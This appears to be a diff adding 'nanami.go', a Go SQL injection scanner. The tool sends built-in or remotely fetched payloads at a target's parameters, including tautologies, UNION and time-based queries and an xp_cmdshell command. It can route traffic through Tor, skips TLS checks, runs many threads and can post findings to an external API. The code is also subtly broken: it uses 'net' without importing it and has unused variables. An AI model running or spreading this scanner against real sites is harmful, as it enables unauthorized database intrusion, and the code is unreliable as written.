@@ -1,0 +1,606 @@
+// nanami.go
+// High-Performance SQL Injection Scanner
+// Made by nanami
+// Use responsibly and only on authorized targets.
+
+package main
+
+import (
+	"bufio"
+	"context"
+	"crypto/tls"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io"
+	"net/http"
+	"net/url"
+	"os"
+	"path/filepath"
+	"regexp"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"golang.org/x/net/proxy"
+)
+
+const (
+	version     = "1.0.0"
+	userAgent   = "Nanami/1.0 (High-Intensity SQLi Scanner; made by nanami)"
+	banner      = "Nanami SQLi Scanner %s - made by nanami\n"
+	defaultThreads = 50
+)
+
+// Configuration holds all runtime settings
+type Configuration struct {
+	TargetURL     string
+	Method        string
+	PostData      string
+	Headers       []string
+	Cookies       string
+	PayloadFile   string
+	Threads       int
+	InjectParam   string
+	Timeout       time.Duration
+	Retries       int
+	Proxy         string
+	TorProxy      bool
+	FetchPayloads bool
+	ReportAPI     string
+	Verbose       bool
+	OutputDir     string
+}
+
+// Result holds a discovered vulnerability
+type Result struct {
+	URL     string
+	Param   string
+	Payload string
+	Error   string
+}
+
+// SQL error patterns (regex) for detection
+var sqlErrorPatterns = []*regexp.Regexp{
+	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
+	regexp.MustCompile(`(?i)Warning.*mysql_.*`),
+	regexp.MustCompile(`(?i)MySQLSyntaxErrorException`),
+	regexp.MustCompile(`(?i)valid MySQL result`),
+	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
+	regexp.MustCompile(`(?i)Warning.*\Wpg_.*`),
+	regexp.MustCompile(`(?i)valid PostgreSQL result`),
+	regexp.MustCompile(`(?i)ORA-[0-9]{5}`),
+	regexp.MustCompile(`(?i)Oracle error`),
+	regexp.MustCompile(`(?i)Oracle.*Driver`),
+	regexp.MustCompile(`(?i)Microsoft OLE DB.*SQL Server`),
+	regexp.MustCompile(`(?i)Unclosed quotation mark`),
+	regexp.MustCompile(`(?i)System\.Data\.SqlClient\.SqlException`),
+	regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
+	regexp.MustCompile(`(?i)SQLite\.Exception`),
+}
+
+var (
+	results     []Result
+	resultsMu   sync.Mutex
+	vulnCount   uint64
+	requestCount uint64
+	client      *http.Client
+)
+
+func main() {
+	cfg := parseFlags()
+
+	// Print banner
+	fmt.Printf(banner, version)
+
+	// Prepare output directory
+	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
+		fmt.Fprintf(os.Stderr, "Failed to create output directory: %v\n", err)
+		os.Exit(1)
+	}
+
+	// Setup HTTP client
+	setupHTTPClient(cfg)
+
+	// Load payloads
+	payloads, err := loadPayloads(cfg)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "Error loading payloads: %v\n", err)
+		os.Exit(1)
+	}
+	logInfo(cfg, fmt.Sprintf("Loaded %d payloads", len(payloads)))
+
+	// Determine injection parameter
+	param := determineParam(cfg)
+	logInfo(cfg, fmt.Sprintf("Testing parameter: %s", param))
+
+	// Create worker pool
+	payloadChan := make(chan string, len(payloads))
+	for _, p := range payloads {
+		payloadChan <- p
+	}
+	close(payloadChan)
+
+	var wg sync.WaitGroup
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	// Progress reporter
+	go progressReporter(ctx, cfg.Verbose)
+
+	// Launch workers
+	for i := 0; i < cfg.Threads; i++ {
+		wg.Add(1)
+		go worker(ctx, &wg, payloadChan, cfg, param)
+	}
+
+	wg.Wait()
+
+	// Save results
+	saveResults(cfg)
+
+	// Report to API if enabled
+	if cfg.ReportAPI != "" {
+		reportToAPI(cfg)
+	}
+
+	logInfo(cfg, fmt.Sprintf("Scan completed. Vulnerabilities found: %d", vulnCount))
+	fmt.Printf("\nResults saved to %s/vulnerable.txt\n", cfg.OutputDir)
+}
+
+func parseFlags() *Configuration {
+	cfg := &Configuration{}
+
+	flag.StringVar(&cfg.TargetURL, "u", "", "Target URL (required)")
+	flag.StringVar(&cfg.Method, "m", "GET", "HTTP method (GET/POST)")
+	flag.StringVar(&cfg.PostData, "d", "", "POST data (key=value&...)")
+	flag.StringVar(&cfg.PayloadFile, "p", "payloads.txt", "File containing SQLi payloads")
+	flag.IntVar(&cfg.Threads, "t", defaultThreads, "Number of concurrent threads")
+	flag.StringVar(&cfg.InjectParam, "param", "", "Parameter to inject (auto-detect if empty)")
+	flag.DurationVar(&cfg.Timeout, "timeout", 10*time.Second, "Request timeout")
+	flag.IntVar(&cfg.Retries, "retries", 1, "Number of retries on failure")
+	flag.StringVar(&cfg.Proxy, "proxy", "", "HTTP/SOCKS5 proxy (e.g., http://127.0.0.1:8080 or socks5://127.0.0.1:9050)")
+	flag.BoolVar(&cfg.TorProxy, "tor", false, "Use Tor SOCKS5 proxy (127.0.0.1:9050)")
+	flag.BoolVar(&cfg.FetchPayloads, "fetch-payloads", false, "Fetch payloads from remote API")
+	flag.StringVar(&cfg.ReportAPI, "report-api", "", "API endpoint to send results (POST JSON)")
+	flag.BoolVar(&cfg.Verbose, "v", false, "Verbose output")
+	flag.StringVar(&cfg.OutputDir, "o", "nanami_out", "Output directory")
+	flag.StringVar(&cfg.Cookies, "cookies", "", "Cookie header value")
+
+	// Custom headers (can be repeated)
+	var headers arrayFlags
+	flag.Var(&headers, "H", "Extra header (e.g., 'X-Forwarded-For: 127.0.0.1')")
+
+	flag.Usage = func() {
+		fmt.Fprintf(os.Stderr, "Nanami SQLi Scanner - made by nanami\n")
+		fmt.Fprintf(os.Stderr, "Usage: %s -u <target_url> [options]\n\n", os.Args[0])
+		flag.PrintDefaults()
+		fmt.Fprintf(os.Stderr, "\nExamples:\n")
+		fmt.Fprintf(os.Stderr, "  %s -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" -t 100\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "  %s -u \"http://target.com/login\" -m POST -d \"user=admin&pass=123\" -p mypayloads.txt -t 200\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "  %s -u \"http://onion.site\" --tor -t 50\n", os.Args[0])
+	}
+
+	flag.Parse()
+
+	if cfg.TargetURL == "" {
+		flag.Usage()
+		os.Exit(1)
+	}
+
+	cfg.Headers = headers
+
+	// Add cookie header if provided
+	if cfg.Cookies != "" {
+		cfg.Headers = append(cfg.Headers, "Cookie: "+cfg.Cookies)
+	}
+
+	// Tor shortcut
+	if cfg.TorProxy {
+		cfg.Proxy = "socks5://127.0.0.1:9050"
+	}
+
+	return cfg
+}
+
+// arrayFlags allows multiple -H flags
+type arrayFlags []string
+
+func (i *arrayFlags) String() string {
+	return strings.Join(*i, ", ")
+}
+
+func (i *arrayFlags) Set(value string) error {
+	*i = append(*i, value)
+	return nil
+}
+
+func setupHTTPClient(cfg *Configuration) {
+	transport := &http.Transport{
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+		MaxIdleConns:        cfg.Threads * 2,
+		MaxIdleConnsPerHost: cfg.Threads,
+		IdleConnTimeout:     90 * time.Second,
+		DisableCompression:  true,
+	}
+
+	// Configure proxy if needed
+	if cfg.Proxy != "" {
+		proxyURL, err := url.Parse(cfg.Proxy)
+		if err == nil {
+			if proxyURL.Scheme == "socks5" {
+				// Use golang.org/x/net/proxy for SOCKS5
+				dialer, err := proxy.SOCKS5("tcp", proxyURL.Host, nil, proxy.Direct)
+				if err == nil {
+					transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+						return dialer.(proxy.ContextDialer).DialContext(ctx, network, addr)
+					}
+				}
+			} else {
+				transport.Proxy = http.ProxyURL(proxyURL)
+			}
+		}
+	}
+
+	client = &http.Client{
+		Transport: transport,
+		Timeout:   cfg.Timeout,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse // don't follow redirects
+		},
+	}
+}
+
+func loadPayloads(cfg *Configuration) ([]string, error) {
+	if cfg.FetchPayloads {
+		payloads, err := fetchPayloadsFromAPI()
+		if err == nil && len(payloads) > 0 {
+			logInfo(cfg, fmt.Sprintf("Fetched %d payloads from API", len(payloads)))
+			return payloads, nil
+		}
+		logInfo(cfg, "Failed to fetch payloads from API, falling back to file")
+	}
+
+	// Read from file
+	file, err := os.Open(cfg.PayloadFile)
+	if err != nil {
+		// Generate default payloads if file not found
+		if os.IsNotExist(err) {
+			return generateDefaultPayloads(), nil
+		}
+		return nil, err
+	}
+	defer file.Close()
+
+	var payloads []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line != "" && !strings.HasPrefix(line, "#") {
+			payloads = append(payloads, line)
+		}
+	}
+	return payloads, scanner.Err()
+}
+
+func fetchPayloadsFromAPI() ([]string, error) {
+	// Example API endpoint (replace with real one if needed)
+	apiURL := "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit.txt"
+	resp, err := http.Get(apiURL)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	lines := strings.Split(string(body), "\n")
+	var payloads []string
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line != "" && !strings.HasPrefix(line, "#") {
+			payloads = append(payloads, line)
+		}
+	}
+	return payloads, nil
+}
+
+func generateDefaultPayloads() []string {
+	return []string{
+		"'",
+		"' OR '1'='1",
+		"' OR '1'='1' --",
+		"\" OR \"1\"=\"1",
+		"\" OR \"1\"=\"1\" --",
+		"' OR ''='",
+		"' OR 1=1#",
+		"' OR 1=1/*",
+		"1' AND '1'='1",
+		"1' AND '1'='2",
+		"' UNION SELECT NULL--",
+		"' UNION SELECT NULL,NULL--",
+		"' UNION SELECT @@version--",
+		"'; WAITFOR DELAY '0:0:5'--",
+		"'; SELECT pg_sleep(5)--",
+		"' AND SLEEP(5)--",
+		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+		"' OR (SELECT COUNT(*) FROM users) > 0--",
+		"' AND '1'=(SELECT CASE WHEN (1=1) THEN '1' ELSE '2' END)--",
+		"' OR 1=1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
+	}
+}
+
+func determineParam(cfg *Configuration) string {
+	if cfg.InjectParam != "" {
+		return cfg.InjectParam
+	}
+
+	if cfg.Method == "GET" {
+		if u, err := url.Parse(cfg.TargetURL); err == nil {
+			if query := u.Query(); len(query) > 0 {
+				for k := range query {
+					return k // return first parameter
+				}
+			}
+		}
+	} else if cfg.Method == "POST" && cfg.PostData != "" {
+		parts := strings.Split(cfg.PostData, "&")
+		if len(parts) > 0 {
+			kv := strings.SplitN(parts[0], "=", 2)
+			if len(kv) > 0 {
+				return kv[0]
+			}
+		}
+	}
+	return "" // fallback
+}
+
+func worker(ctx context.Context, wg *sync.WaitGroup, payloadChan <-chan string, cfg *Configuration, param string) {
+	defer wg.Done()
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case payload, ok := <-payloadChan:
+			if !ok {
+				return
+			}
+			// Skip empty payloads
+			if payload == "" {
+				continue
+			}
+			testInjection(cfg, param, payload)
+		}
+	}
+}
+
+func testInjection(cfg *Configuration, param, payload string) {
+	atomic.AddUint64(&requestCount, 1)
+
+	var req *http.Request
+	var err error
+	var targetURL = cfg.TargetURL
+	var body string
+
+	// Encode payload for URL
+	encodedPayload := url.QueryEscape(payload)
+
+	if cfg.Method == "GET" {
+		// Replace parameter value in URL
+		u, err := url.Parse(targetURL)
+		if err != nil {
+			return
+		}
+		q := u.Query()
+		if q.Has(param) {
+			q.Set(param, payload) // keep raw for injection, URL encoding happens automatically
+			u.RawQuery = q.Encode()
+			targetURL = u.String()
+		} else {
+			// Append parameter if not present
+			if u.RawQuery == "" {
+				u.RawQuery = fmt.Sprintf("%s=%s", param, encodedPayload)
+			} else {
+				u.RawQuery += fmt.Sprintf("&%s=%s", param, encodedPayload)
+			}
+			targetURL = u.String()
+		}
+		req, err = http.NewRequest("GET", targetURL, nil)
+	} else {
+		// POST method
+		data := cfg.PostData
+		// Replace parameter value
+		re := regexp.MustCompile(fmt.Sprintf(`(%s=)[^&]*`, regexp.QuoteMeta(param)))
+		data = re.ReplaceAllString(data, fmt.Sprintf("${1}%s", encodedPayload))
+		body = data
+		req, err = http.NewRequest("POST", targetURL, strings.NewReader(data))
+		if req != nil {
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		}
+	}
+
+	if err != nil {
+		return
+	}
+
+	// Set headers
+	req.Header.Set("User-Agent", userAgent)
+	for _, h := range cfg.Headers {
+		parts := strings.SplitN(h, ":", 2)
+		if len(parts) == 2 {
+			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
+		}
+	}
+
+	// Retry logic
+	var resp *http.Response
+	for i := 0; i <= cfg.Retries; i++ {
+		resp, err = client.Do(req)
+		if err == nil {
+			break
+		}
+		time.Sleep(100 * time.Millisecond)
+	}
+	if err != nil || resp == nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	// Read response body (limited)
+	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 1MB max
+	if err != nil {
+		return
+	}
+	bodyStr := string(respBody)
+
+	// Check for SQL errors
+	if detectSQLInjection(bodyStr) {
+		atomic.AddUint64(&vulnCount, 1)
+		resultsMu.Lock()
+		results = append(results, Result{
+			URL:     targetURL,
+			Param:   param,
+			Payload: payload,
+			Error:   extractFirstError(bodyStr),
+		})
+		resultsMu.Unlock()
+
+		logVuln(cfg, param, payload, extractFirstError(bodyStr))
+	}
+
+	if cfg.Verbose {
+		logVerbose(cfg, fmt.Sprintf("Tested: %s = %s [%d]", param, payload, resp.StatusCode))
+	}
+}
+
+func detectSQLInjection(body string) bool {
+	for _, pattern := range sqlErrorPatterns {
+		if pattern.MatchString(body) {
+			return true
+		}
+	}
+	return false
+}
+
+func extractFirstError(body string) string {
+	for _, pattern := range sqlErrorPatterns {
+		if match := pattern.FindString(body); match != "" {
+			return match
+		}
+	}
+	return "SQL error pattern matched"
+}
+
+func progressReporter(ctx context.Context, verbose bool) {
+	if verbose {
+		return
+	}
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-ticker.C:
+			reqs := atomic.LoadUint64(&requestCount)
+			vulns := atomic.LoadUint64(&vulnCount)
+			fmt.Printf("\r[Progress] Requests: %d | Vulnerabilities: %d", reqs, vulns)
+		}
+	}
+}
+
+func saveResults(cfg *Configuration) {
+	// Save vulnerable list
+	vulnFile := filepath.Join(cfg.OutputDir, "vulnerable.txt")
+	f, err := os.Create(vulnFile)
+	if err != nil {
+		logError(cfg, fmt.Sprintf("Failed to create results file: %v", err))
+		return
+	}
+	defer f.Close()
+
+	for _, r := range results {
+		fmt.Fprintf(f, "URL: %s\nParam: %s\nPayload: %s\nError: %s\n\n", r.URL, r.Param, r.Payload, r.Error)
+	}
+
+	// Save full log
+	logFile := filepath.Join(cfg.OutputDir, "scan.log")
+	// Already using logInfo/logError which write to this file
+}
+
+func reportToAPI(cfg *Configuration) {
+	if len(results) == 0 {
+		return
+	}
+
+	type Report struct {
+		Target          string   `json:"target"`
+		Vulnerabilities []Result `json:"vulnerabilities"`
+		Count           int      `json:"count"`
+		Scanner         string   `json:"scanner"`
+	}
+
+	report := Report{
+		Target:          cfg.TargetURL,
+		Vulnerabilities: results,
+		Count:           len(results),
+		Scanner:         "Nanami/" + version,
+	}
+
+	jsonData, err := json.Marshal(report)
+	if err != nil {
+		logError(cfg, fmt.Sprintf("Failed to marshal report: %v", err))
+		return
+	}
+
+	resp, err := http.Post(cfg.ReportAPI, "application/json", strings.NewReader(string(jsonData)))
+	if err != nil {
+		logError(cfg, fmt.Sprintf("Failed to send report: %v", err))
+		return
+	}
+	defer resp.Body.Close()
+	logInfo(cfg, "Report sent to API successfully")
+}
+
+// Logging helpers
+func logInfo(cfg *Configuration, msg string) {
+	logEntry := fmt.Sprintf("[%s] [INFO] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
+	fmt.Print(logEntry)
+	logToFile(cfg, logEntry)
+}
+
+func logError(cfg *Configuration, msg string) {
+	logEntry := fmt.Sprintf("[%s] [ERROR] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
+	fmt.Fprint(os.Stderr, logEntry)
+	logToFile(cfg, logEntry)
+}
+
+func logVuln(cfg *Configuration, param, payload, errMsg string) {
+	logEntry := fmt.Sprintf("[%s] [VULN] Param: %s | Payload: %q | Error: %s\n",
+		time.Now().Format("2006-01-02 15:04:05"), param, payload, errMsg)
+	fmt.Print(logEntry)
+	logToFile(cfg, logEntry)
+}
+
+func logVerbose(cfg *Configuration, msg string) {
+	if cfg.Verbose {
+		logEntry := fmt.Sprintf("[%s] [DEBUG] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
+		fmt.Print(logEntry)
+		logToFile(cfg, logEntry)
+	}
+}
+
+func logToFile(cfg *Configuration, entry string) {
+	logPath := filepath.Join(cfg.OutputDir, "scan.log")
+	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+	f.WriteString(entry)
+}
